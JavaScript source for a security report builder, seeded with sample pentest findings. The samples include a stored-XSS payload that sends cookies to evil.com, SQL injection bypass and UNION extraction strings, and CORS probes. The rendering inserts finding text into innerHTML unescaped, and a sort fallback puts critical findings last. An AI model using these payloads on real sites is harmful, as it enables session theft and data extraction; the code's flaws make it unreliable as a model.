// Copyright (c) 2026 Darknode-Official. All rights reserved.
// Security Assessment Report Builder — generate professional pentest/VA reports.

const REPORT_TEMPLATES = [
  { id: "pentest", name: "Penetration Test Report", sections: ["cover", "executive_summary", "scope", "methodology", "findings", "risk_matrix", "recommendations", "appendix"] },
  { id: "va", name: "Vulnerability Assessment", sections: ["cover", "executive_summary", "scope", "scan_config", "findings", "risk_matrix", "remediation_plan", "appendix"] },
  { id: "compliance", name: "Compliance Audit Report", sections: ["cover", "executive_summary", "scope", "framework", "control_assessment", "gaps", "recommendations", "appendix"] },
  { id: "incident", name: "Incident Response Report", sections: ["cover", "executive_summary", "timeline", "root_cause", "impact", "containment", "remediation", "lessons_learned"] },
  { id: "risk", name: "Risk Assessment Report", sections: ["cover", "executive_summary", "scope", "asset_inventory", "threat_analysis", "risk_register", "treatment_plan", "appendix"] },
  { id: "architecture", name: "Security Architecture Review", sections: ["cover", "executive_summary", "scope", "architecture_overview", "findings", "threat_model", "recommendations", "appendix"] }
];

const SAMPLE_FINDINGS = [
  { title: "SQL Injection in Login Form", severity: "critical", cvss: 9.8, cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", description: "The login form at /api/auth/login is vulnerable to SQL injection via the username parameter. An unauthenticated attacker can extract the entire database, bypass authentication, or execute arbitrary commands on the database server.", impact: "Complete compromise of the application database including all user credentials, personal data, and financial records. Potential for remote code execution on the database server via xp_cmdshell or UDF injection.", steps_to_reproduce: "1. Navigate to /login\n2. Enter username: admin' OR '1'='1'-- -\n3. Enter any password\n4. Observe: authentication bypassed, logged in as admin\n5. For data extraction: admin' UNION SELECT username,password,3,4 FROM users-- -", evidence: "HTTP Request:\nPOST /api/auth/login\n{\"username\":\"admin' OR '1'='1'-- -\",\"password\":\"x\"}\n\nHTTP Response: 200 OK\n{\"token\":\"eyJhbG...\",\"user\":{\"role\":\"admin\"}}", remediation: "1. Implement parameterized queries/prepared statements for all database queries\n2. Use an ORM with built-in SQL injection protection\n3. Apply input validation (allowlist approach)\n4. Implement WAF rules as defense-in-depth\n5. Apply principle of least privilege for database accounts", references: ["OWASP SQL Injection", "CWE-89"], affected_systems: ["/api/auth/login", "/api/auth/register"], status: "open", cwe: "CWE-89" },
  { title: "Stored Cross-Site Scripting (XSS) in User Profiles", severity: "high", cvss: 8.1, cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N", description: "The user profile 'About Me' field does not sanitize HTML input. An authenticated user can inject malicious JavaScript that executes in the browsers of other users viewing the profile, enabling session hijacking, credential theft, or account takeover.", impact: "Account takeover of any user who views the malicious profile. Session cookies can be exfiltrated to an attacker-controlled server. Administrative accounts are particularly at risk, which could lead to full application compromise.", steps_to_reproduce: "1. Log in with any user account\n2. Navigate to Profile → Edit\n3. In the 'About Me' field, enter: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n4. Save profile\n5. When any other user views this profile, their session cookie is sent to evil.com", evidence: "Payload in profile field persists in database and renders unescaped in victim's browser. Tested with alert(document.domain) — executes successfully.", remediation: "1. Implement output encoding (HTML entity encoding) for all user-generated content\n2. Use Content Security Policy (CSP) header with strict script-src directive\n3. Set HttpOnly flag on session cookies to prevent JavaScript access\n4. Implement DOMPurify or similar sanitization library for rich text fields", references: ["OWASP XSS Prevention", "CWE-79"], affected_systems: ["/profile/{id}", "/api/users/{id}"], status: "open", cwe: "CWE-79" },
  { title: "Missing Rate Limiting on Authentication Endpoint", severity: "high", cvss: 7.5, cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", description: "The authentication endpoint /api/auth/login does not implement rate limiting or account lockout. An attacker can perform unlimited login attempts, enabling brute force and credential stuffing attacks.", impact: "Successful brute force of user accounts with weak passwords. Large-scale credential stuffing using leaked credential databases. No detection or prevention mechanism exists.", steps_to_reproduce: "1. Send 1000+ login requests with different passwords for a single account using Burp Intruder\n2. Observe: all requests return 200/401 with no rate limiting, CAPTCHA, or lockout\n3. Average response time remains consistent, indicating no throttling", evidence: "Sent 5,000 requests in 60 seconds to /api/auth/login. No blocking, no CAPTCHA challenge, no account lockout triggered. All requests processed normally.", remediation: "1. Implement rate limiting (e.g., 5 attempts per minute per account)\n2. Add progressive delays after failed attempts\n3. Implement CAPTCHA after 3 failed attempts\n4. Add account lockout after 10 failed attempts (with unlock via email)\n5. Implement credential stuffing detection (multiple accounts from same IP)\n6. Alert security team on brute force patterns", references: ["OWASP Brute Force", "CWE-307"], affected_systems: ["/api/auth/login"], status: "open", cwe: "CWE-307" },
  { title: "Insecure Direct Object Reference (IDOR) in User API", severity: "high", cvss: 7.5, cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", description: "The /api/users/{id} endpoint allows authenticated users to access and modify other users' data by changing the numeric ID parameter. No authorization check verifies that the requesting user owns the requested resource.", impact: "Any authenticated user can view and modify all other users' profiles, including email addresses, personal information, and account settings. An attacker could change other users' passwords, leading to mass account takeover.", steps_to_reproduce: "1. Log in as user A (ID: 42)\n2. Send GET /api/users/42 — returns user A's data (expected)\n3. Send GET /api/users/1 — returns admin's data (IDOR!)\n4. Send PUT /api/users/1 with modified data — admin's profile is updated", evidence: "GET /api/users/1\nAuthorization: Bearer <user_A_token>\n\nResponse 200: {\"id\":1,\"email\":\"admin@target.com\",\"role\":\"admin\",...}", remediation: "1. Implement authorization checks on every API endpoint\n2. Verify the authenticated user has permission to access the requested resource\n3. Use indirect references (UUIDs) instead of sequential IDs\n4. Implement ABAC or RBAC at the API layer\n5. Add automated authorization testing to CI/CD pipeline", references: ["OWASP IDOR", "CWE-639"], affected_systems: ["/api/users/{id}", "/api/users/{id}/settings"], status: "open", cwe: "CWE-639" },
  { title: "Sensitive Data Exposure — API Keys in Client-Side JavaScript", severity: "medium", cvss: 6.5, cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", description: "Third-party API keys (Stripe secret key, AWS access key, SendGrid API key) are hardcoded in client-side JavaScript files, accessible to any visitor by viewing page source or browser developer tools.", impact: "Exposed Stripe secret key allows unauthorized charges and refunds. Exposed AWS key provides access to S3 buckets containing customer data. Exposed SendGrid key enables email sending as the organization.", steps_to_reproduce: "1. Navigate to the application in a browser\n2. Open Developer Tools → Sources tab\n3. Search JavaScript files for 'sk_live', 'AKIA', 'SG.'\n4. Find API keys in /static/js/app.bundle.js", evidence: "Found in app.bundle.js:\n- Stripe: <STRIPE_KEY>\n- AWS: AKIA4EXAMPLE...\n- SendGrid: SG.xxxx...", remediation: "1. Immediately rotate all exposed API keys\n2. Move API calls to server-side code (never expose secret keys client-side)\n3. Use environment variables for all secrets\n4. Implement secret scanning in CI/CD (git-secrets, TruffleHog)\n5. Add pre-commit hooks to prevent secret commits\n6. Use client-side publishable keys only (e.g., Stripe pk_live_)", references: ["OWASP Sensitive Data Exposure", "CWE-798"], affected_systems: ["/static/js/app.bundle.js"], status: "open", cwe: "CWE-798" },
  { title: "Missing Security Headers", severity: "medium", cvss: 5.3, cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N", description: "The application is missing several critical HTTP security headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, and Permissions-Policy.", impact: "Without these headers, the application is more susceptible to XSS attacks (no CSP), clickjacking (no X-Frame-Options), MIME-type sniffing attacks (no X-Content-Type-Options), and information leakage (no Referrer-Policy).", steps_to_reproduce: "1. Send any request to the application\n2. Inspect response headers\n3. Note the absence of security headers", evidence: "curl -I https://target.com\nHTTP/2 200\nContent-Type: text/html\nServer: nginx\n[No security headers present]", remediation: "Add the following headers to all responses:\n- Content-Security-Policy: default-src 'self'; script-src 'self'\n- X-Frame-Options: DENY\n- X-Content-Type-Options: nosniff\n- Referrer-Policy: strict-origin-when-cross-origin\n- Permissions-Policy: camera=(), microphone=(), geolocation=()\n- Strict-Transport-Security: max-age=31536000; includeSubDomains", references: ["OWASP Secure Headers", "securityheaders.com"], affected_systems: ["All endpoints"], status: "open", cwe: "CWE-693" },
  { title: "Outdated TLS Configuration", severity: "medium", cvss: 5.9, cvss_vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", description: "The server supports TLS 1.0 and TLS 1.1, which have known vulnerabilities (BEAST, POODLE). Several weak cipher suites are also enabled, including those using RC4, DES, and CBC mode.", impact: "Traffic encrypted with TLS 1.0/1.1 or weak cipher suites may be decrypted by a sophisticated attacker using known cryptographic attacks, exposing sensitive data including credentials and personal information.", steps_to_reproduce: "1. Run: nmap --script ssl-enum-ciphers -p 443 target.com\n2. Run: testssl.sh target.com\n3. Observe TLS 1.0 and 1.1 are supported\n4. Observe weak cipher suites are enabled", evidence: "testssl.sh output:\nTLS 1.0: offered (NOT ok)\nTLS 1.1: offered (NOT ok)\nRC4: offered (NOT ok)\nCBC ciphers: offered", remediation: "1. Disable TLS 1.0 and TLS 1.1 — only allow TLS 1.2 and 1.3\n2. Disable all RC4, DES, 3DES, and CBC-mode cipher suites\n3. Prefer AEAD cipher suites (AES-GCM, ChaCha20-Poly1305)\n4. Enable HSTS with max-age of at least 1 year\n5. Recommended cipher order for TLS 1.2: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384", references: ["Mozilla SSL Configuration Generator", "CWE-326"], affected_systems: ["Web server TLS configuration"], status: "open", cwe: "CWE-326" },
  { title: "Directory Listing Enabled on Web Server", severity: "low", cvss: 3.7, cvss_vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N", description: "Directory listing is enabled on several web server paths, allowing anyone to browse the file structure and discover hidden files, backup files, and configuration files.", impact: "Attackers can discover backup files (.bak, .old), configuration files, internal documentation, or other sensitive resources that are not linked from the application but accessible if the filename is known.", steps_to_reproduce: "1. Navigate to https://target.com/assets/\n2. Observe: directory listing shows all files\n3. Navigate to https://target.com/uploads/\n4. Observe: user-uploaded files are browsable", evidence: "Index of /assets/\n  backup/        2024-01-15\n  config.old     2024-02-20\n  .env.bak       2024-03-01", remediation: "1. Disable directory listing in web server configuration\n   - Apache: Options -Indexes in .htaccess or httpd.conf\n   - Nginx: autoindex off in server block\n2. Remove backup and old configuration files from web-accessible directories\n3. Implement proper access controls on upload directories", references: ["CWE-548"], affected_systems: ["/assets/", "/uploads/", "/static/"], status: "open", cwe: "CWE-548" },
  { title: "Cross-Origin Resource Sharing (CORS) Misconfiguration", severity: "medium", cvss: 6.1, cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", description: "The API reflects the Origin header in the Access-Control-Allow-Origin response without validation, and includes Access-Control-Allow-Credentials: true. This allows any website to make authenticated cross-origin requests to the API.", impact: "An attacker can create a malicious website that makes authenticated API requests on behalf of any user who visits it. This enables reading sensitive user data, modifying account settings, or performing actions as the victim.", steps_to_reproduce: "1. Send request with header: Origin: https://evil.com\n2. Observe response: Access-Control-Allow-Origin: https://evil.com\n3. Observe: Access-Control-Allow-Credentials: true\n4. Attacker's site can now read API responses with victim's cookies", evidence: "curl -H 'Origin: https://evil.com' https://api.target.com/me\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true", remediation: "1. Implement a strict allowlist of trusted origins\n2. Never reflect the Origin header directly\n3. If credentials are not needed cross-origin, remove Access-Control-Allow-Credentials\n4. Consider if CORS is needed at all — same-origin is the safest default", references: ["OWASP CORS", "CWE-942"], affected_systems: ["/api/*"], status: "open", cwe: "CWE-942" },
  { title: "Information Disclosure via Verbose Error Messages", severity: "low", cvss: 3.1, cvss_vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N", description: "The application returns detailed error messages including stack traces, database query details, framework versions, and internal file paths in API error responses.", impact: "Detailed error messages reveal internal implementation details (technology stack, file paths, database structure) that assist attackers in crafting targeted attacks. Stack traces may reveal vulnerable library versions.", steps_to_reproduce: "1. Send malformed JSON to any POST endpoint\n2. Observe the 500 response containing a full stack trace\n3. Note: Express.js version, MongoDB connection string format, internal file paths", evidence: "Response body:\n{\"error\":\"CastError\",\"message\":\"Cast to ObjectId failed\",\"stack\":\"at /app/node_modules/mongoose/lib/...\",\"path\":\"/home/deploy/app/src/controllers/user.js:42\"}", remediation: "1. Implement a global error handler that returns generic error messages to clients\n2. Log detailed errors server-side only\n3. Return consistent error format: {\"error\": \"An error occurred\", \"code\": \"INTERNAL_ERROR\"}\n4. Disable stack traces in production (NODE_ENV=production)\n5. Remove server version headers (Server, X-Powered-By)", references: ["OWASP Error Handling", "CWE-209"], affected_systems: ["All API endpoints"], status: "open", cwe: "CWE-209" }
];

const CVSS_METRICS = {
  AV: { name: "Attack Vector", values: [{ key: "N", label: "Network", score: 0.85 }, { key: "A", label: "Adjacent", score: 0.62 }, { key: "L", label: "Local", score: 0.55 }, { key: "P", label: "Physical", score: 0.2 }] },
  AC: { name: "Attack Complexity", values: [{ key: "L", label: "Low", score: 0.77 }, { key: "H", label: "High", score: 0.44 }] },
  PR: { name: "Privileges Required", values: [{ key: "N", label: "None", score: 0.85 }, { key: "L", label: "Low", score: 0.62 }, { key: "H", label: "High", score: 0.27 }] },
  UI: { name: "User Interaction", values: [{ key: "N", label: "None", score: 0.85 }, { key: "R", label: "Required", score: 0.62 }] },
  S: { name: "Scope", values: [{ key: "U", label: "Unchanged", score: 0 }, { key: "C", label: "Changed", score: 1 }] },
  C: { name: "Confidentiality", values: [{ key: "H", label: "High", score: 0.56 }, { key: "L", label: "Low", score: 0.22 }, { key: "N", label: "None", score: 0 }] },
  I: { name: "Integrity", values: [{ key: "H", label: "High", score: 0.56 }, { key: "L", label: "Low", score: 0.22 }, { key: "N", label: "None", score: 0 }] },
  A: { name: "Availability", values: [{ key: "H", label: "High", score: 0.56 }, { key: "L", label: "Low", score: 0.22 }, { key: "N", label: "None", score: 0 }] }
};

function calculateCVSS(metrics) {
  const av = metrics.AV, ac = metrics.AC, pr = metrics.PR, ui = metrics.UI;
  const s = metrics.S, c = metrics.C, i = metrics.I, a = metrics.A;
  if ([av, ac, pr, ui, s, c, i, a].some(v => v === undefined)) return null;
  const iss = 1 - ((1 - c) * (1 - i) * (1 - a));
  let impact, exploitability;
  if (s === 0) {
    impact = 6.42 * iss;
  } else {
    impact = 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
  }
  const prAdj = s === 1 ? (pr === 0.62 ? 0.68 : pr === 0.27 ? 0.50 : pr) : pr;
  exploitability = 8.22 * av * ac * prAdj * ui;
  if (impact <= 0) return 0;
  let score;
  if (s === 0) {
    score = Math.min(impact + exploitability, 10);
  } else {
    score = Math.min(1.08 * (impact + exploitability), 10);
  }
  return Math.ceil(score * 10) / 10;
}

function severityFromScore(score) {
  if (score >= 9.0) return { label: "Critical", color: "#dc2626" };
  if (score >= 7.0) return { label: "High", color: "#f97316" };
  if (score >= 4.0) return { label: "Medium", color: "#eab308" };
  if (score >= 0.1) return { label: "Low", color: "#22c55e" };
  return { label: "None", color: "#6b7280" };
}

export function renderReportBuilder(container) {
  let findings = [...SAMPLE_FINDINGS];
  let selectedTemplate = REPORT_TEMPLATES[0];
  let view = "template";

  function renderTemplateSelect() {
    view = "template";
    container.innerHTML = `
      <div style="max-width:900px;margin:40px auto;padding:20px">
        <h1 style="margin:0 0 8px;font-size:1.8rem;font-weight:800;color:var(--txt,#f9fafb)">Security Report Builder</h1>
        <p style="margin:0 0 24px;font-size:.9rem;color:var(--mut,#9ca3af)">Generate professional security assessment reports. Choose a template to get started.</p>
        <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px;margin-bottom:24px">
          ${REPORT_TEMPLATES.map(t => `
            <div class="tmpl-card" data-id="${t.id}" style="background:var(--surface,#111827);border:1px solid var(--border,#1f2937);border-radius:10px;padding:18px;cursor:pointer;transition:border-color .2s">
              <h3 style="margin:0 0 6px;font-size:1rem;font-weight:700;color:var(--txt,#f9fafb)">${t.name}</h3>
              <p style="margin:0;font-size:.78rem;color:var(--mut,#6b7280)">${t.sections.length} sections</p>
            </div>
          `).join("")}
        </div>
        <div style="background:var(--surface,#111827);border:1px solid var(--border,#1f2937);border-radius:10px;padding:18px">
          <h3 style="margin:0 0 12px;font-size:1rem;font-weight:700;color:var(--txt,#f9fafb)">Sample Findings (${findings.length})</h3>
          <div style="display:grid;gap:8px">
            ${findings.map((f, i) => {
              const sev = { critical: "#dc2626", high: "#f97316", medium: "#eab308", low: "#22c55e", info: "#3b82f6" };
              return `<div style="display:flex;justify-content:space-between;align-items:center;padding:10px 14px;background:rgba(255,255,255,.02);border-radius:6px">
                <div><span style="font-size:.65rem;padding:2px 6px;border-radius:3px;background:${sev[f.severity]}22;color:${sev[f.severity]};border:1px solid ${sev[f.severity]}44;text-transform:uppercase;font-weight:700;margin-right:8px">${f.severity}</span><span style="font-size:.85rem;color:var(--txt,#f9fafb)">${f.title}</span></div>
                <span style="font-size:.8rem;color:var(--mut,#6b7280)">CVSS ${f.cvss}</span>
              </div>`;
            }).join("")}
          </div>
        </div>
        <button id="gen-report" style="margin-top:16px;background:var(--acc,#00d4ff);color:#000;border:none;padding:12px 24px;border-radius:4px;font-size:.95rem;font-weight:700;cursor:pointer">Generate Report Preview</button>
      </div>`;
    container.querySelectorAll(".tmpl-card").forEach(card => {
      card.onmouseenter = () => card.style.borderColor = "var(--acc,#00d4ff)";
      card.onmouseleave = () => card.style.borderColor = "var(--border,#1f2937)";
      card.onclick = () => {
        container.querySelectorAll(".tmpl-card").forEach(c => c.style.borderColor = "var(--border,#1f2937)");
        card.style.borderColor = "var(--acc,#00d4ff)";
        selectedTemplate = REPORT_TEMPLATES.find(t => t.id === card.dataset.id);
      };
    });
    container.querySelector("#gen-report").onclick = renderReport;
  }

  function renderReport() {
    view = "report";
    const sorted = [...findings].sort((a, b) => {
      const order = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
      return (order[a.severity] || 5) - (order[b.severity] || 5);
    });
    const counts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
    for (const f of sorted) counts[f.severity] = (counts[f.severity] || 0) + 1;
    const total = sorted.length;
    const now = new Date().toISOString().split("T")[0];
    const sev = { critical: "#dc2626", high: "#f97316", medium: "#eab308", low: "#22c55e", info: "#3b82f6" };

    container.innerHTML = `
      <div style="max-width:900px;margin:20px auto;padding:20px">
        <button id="report-back" style="background:none;border:1px solid var(--border,#374151);color:var(--txt,#f9fafb);padding:6px 14px;border-radius:4px;cursor:pointer;font-size:.82rem;margin-bottom:16px">← Back to Builder</button>

        <div style="background:var(--surface,#111827);border:1px solid var(--border,#1f2937);border-radius:12px;overflow:hidden">
          <!-- Cover Page -->
          <div style="padding:60px 40px;text-align:center;border-bottom:1px solid var(--border,#1f2937);background:linear-gradient(135deg,rgba(0,212,255,.05),rgba(124,92,255,.05))">
            <div style="font-size:.7rem;color:var(--acc,#00d4ff);text-transform:uppercase;letter-spacing:.15em;font-weight:700;margin-bottom:12px">Confidential</div>
            <h1 style="margin:0 0 8px;font-size:2rem;font-weight:800;color:var(--txt,#f9fafb)">${selectedTemplate.name}</h1>
            <p style="margin:0 0 4px;font-size:1rem;color:var(--mut,#9ca3af)">Prepared by: Darknode Security Team</p>
            <p style="margin:0;font-size:.85rem;color:var(--mut,#6b7280)">Date: ${now} | Version: 1.0</p>
          </div>

          <!-- Executive Summary -->
          <div style="padding:30px 40px;border-bottom:1px solid var(--border,#1f2937)">
            <h2 style="margin:0 0 16px;font-size:1.3rem;font-weight:700;color:var(--acc,#00d4ff)">Executive Summary</h2>
            <p style="font-size:.9rem;color:var(--mut,#d1d5db);line-height:1.7;margin:0 0 16px">
              This ${selectedTemplate.name.toLowerCase()} identified <strong style="color:var(--txt,#f9fafb)">${total} findings</strong> across the target environment.
              Of these, <strong style="color:#dc2626">${counts.critical} are critical</strong>, <strong style="color:#f97316">${counts.high} are high</strong>,
              <strong style="color:#eab308">${counts.medium} are medium</strong>, and <strong style="color:#22c55e">${counts.low} are low</strong> severity.
              Immediate attention is required for critical and high severity findings to reduce the organization's risk exposure.
            </p>
            <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px">
              ${["critical", "high", "medium", "low"].map(s => `
                <div style="text-align:center;padding:16px;border-radius:8px;border:1px solid ${sev[s]}33;background:${sev[s]}11">
                  <div style="font-size:2rem;font-weight:800;color:${sev[s]}">${counts[s]}</div>
                  <div style="font-size:.75rem;text-transform:uppercase;letter-spacing:.06em;color:${sev[s]}">${s}</div>
                </div>
              `).join("")}
            </div>
          </div>

          <!-- Risk Matrix -->
          <div style="padding:30px 40px;border-bottom:1px solid var(--border,#1f2937)">
            <h2 style="margin:0 0 16px;font-size:1.3rem;font-weight:700;color:var(--acc,#00d4ff)">Risk Matrix</h2>
            <div style="display:grid;grid-template-columns:40px repeat(5,1fr);grid-template-rows:repeat(5,40px) 40px;gap:2px;max-width:400px">
              ${[5,4,3,2,1].map((likelihood, li) => {
                return [0,1,2,3,4,5].map(impact => {
                  if (impact === 0) return `<div style="display:flex;align-items:center;justify-content:center;font-size:.6rem;color:var(--mut,#6b7280)">${likelihood}</div>`;
                  const risk = likelihood * impact;
                  const bg = risk >= 15 ? "#dc262644" : risk >= 8 ? "#f9731644" : risk >= 4 ? "#eab30844" : "#22c55e44";
                  const findingsHere = sorted.filter(f => {
                    const s = { critical: 5, high: 4, medium: 3, low: 2, info: 1 };
                    return s[f.severity] === likelihood && impact === Math.ceil(f.cvss / 2);
                  });
                  return `<div style="background:${bg};border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;color:var(--txt,#f9fafb)">${findingsHere.length || ""}</div>`;
                }).join("");
              }).join("")}
              <div></div>
              ${[1,2,3,4,5].map(i => `<div style="display:flex;align-items:center;justify-content:center;font-size:.6rem;color:var(--mut,#6b7280)">${i}</div>`).join("")}
            </div>
            <div style="margin-top:8px;font-size:.7rem;color:var(--mut,#6b7280)">Y-axis: Likelihood | X-axis: Impact</div>
          </div>

          <!-- Findings -->
          <div style="padding:30px 40px">
            <h2 style="margin:0 0 20px;font-size:1.3rem;font-weight:700;color:var(--acc,#00d4ff)">Detailed Findings</h2>
            ${sorted.map((f, i) => `
              <div style="margin-bottom:24px;padding:20px;border:1px solid ${sev[f.severity]}33;border-radius:10px;border-left:4px solid ${sev[f.severity]}">
                <div style="display:flex;justify-content:space-between;align-items:start;margin-bottom:10px">
                  <h3 style="margin:0;font-size:1.05rem;font-weight:700;color:var(--txt,#f9fafb)">Finding ${i + 1}: ${f.title}</h3>
                  <div style="display:flex;gap:8px;flex-shrink:0">
                    <span style="font-size:.65rem;padding:3px 8px;border-radius:4px;background:${sev[f.severity]}22;color:${sev[f.severity]};border:1px solid ${sev[f.severity]}44;text-transform:uppercase;font-weight:700">${f.severity}</span>
                    <span style="font-size:.75rem;padding:3px 8px;border-radius:4px;background:rgba(255,255,255,.05);color:var(--mut,#d1d5db)">CVSS ${f.cvss}</span>
                  </div>
                </div>
                ${f.cwe ? `<div style="font-size:.75rem;color:var(--mut,#6b7280);margin-bottom:10px">${f.cwe} | ${f.cvss_vector}</div>` : ""}
                <div style="margin-bottom:12px"><h4 style="margin:0 0 4px;font-size:.8rem;font-weight:700;color:var(--mut,#9ca3af);text-transform:uppercase;letter-spacing:.04em">Description</h4><p style="margin:0;font-size:.85rem;color:var(--mut,#d1d5db);line-height:1.6">${f.description}</p></div>
                <div style="margin-bottom:12px"><h4 style="margin:0 0 4px;font-size:.8rem;font-weight:700;color:var(--mut,#9ca3af);text-transform:uppercase;letter-spacing:.04em">Impact</h4><p style="margin:0;font-size:.85rem;color:var(--mut,#d1d5db);line-height:1.6">${f.impact}</p></div>
                <div style="margin-bottom:12px"><h4 style="margin:0 0 4px;font-size:.8rem;font-weight:700;color:var(--mut,#9ca3af);text-transform:uppercase;letter-spacing:.04em">Steps to Reproduce</h4><pre style="margin:0;font-size:.78rem;color:#c9d1d9;background:#0d1117;padding:12px;border-radius:6px;overflow-x:auto;white-space:pre-wrap">${f.steps_to_reproduce}</pre></div>
                ${f.evidence ? `<div style="margin-bottom:12px"><h4 style="margin:0 0 4px;font-size:.8rem;font-weight:700;color:var(--mut,#9ca3af);text-transform:uppercase;letter-spacing:.04em">Evidence</h4><pre style="margin:0;font-size:.75rem;color:#c9d1d9;background:#0d1117;padding:12px;border-radius:6px;overflow-x:auto;white-space:pre-wrap">${f.evidence}</pre></div>` : ""}
                <div style="margin-bottom:12px"><h4 style="margin:0 0 4px;font-size:.8rem;font-weight:700;color:#22c55e;text-transform:uppercase;letter-spacing:.04em">Remediation</h4><pre style="margin:0;font-size:.82rem;color:var(--mut,#d1d5db);background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.15);padding:12px;border-radius:6px;white-space:pre-wrap">${f.remediation}</pre></div>
                <div style="font-size:.75rem;color:var(--mut,#6b7280)">Affected: ${(f.affected_systems || []).join(", ")} | References: ${(f.references || []).join(", ")}</div>
              </div>
            `).join("")}
          </div>
        </div>
      </div>`;
    container.querySelector("#report-back").onclick = renderTemplateSelect;
  }

  renderTemplateSelect();
}
